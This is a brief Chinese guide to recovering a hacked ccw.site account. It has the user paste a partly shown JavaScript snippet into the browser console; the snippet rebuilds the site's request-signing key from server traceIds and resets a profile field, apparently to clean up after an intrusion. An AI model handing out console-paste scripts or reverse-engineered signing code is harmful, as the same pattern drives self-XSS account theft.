...
1. 立即关闭整个浏览器的所有窗口。
2. 使用浏览器访问账号设置 https://www.ccw.site/profile/setting ，找到“密码问题”，点击右侧的“修改”，然后修改你的密码。
3. 鼠标右键点击空白处，点击“检查”，然后在弹出来的开发者工具里找到“控制台”或“Console”并点击它。
4. 在控制台里粘贴以下代码，然后enter执行
    ```js
    /**
     * blueimp-md5
    ...
    await fetch("https://community-web.ccw.site/health/check", {
      ...
      credentials: "include"
        ...
        if (j.status != 200) throw new Error(j.msg);
        const hmacKey = j.body.map(({ traceId }) => traceId[parseInt(traceId[0], 16) + 1]).reverse().join("")
        const body = JSON.stringify({"school": ""})
        const headers = { b: Date.now(), "content-type": "application/json" }
    ...
    ```
5. 回到网页，点击“个人资料”，然后修改你的昵称和个性签名，然后点击“保存”。
6. 使用QQ联系共创世界管理员（3026904139）申诉，说明你的账号被黑客入侵，并将账号id告诉他，并且说明你已修改密码。
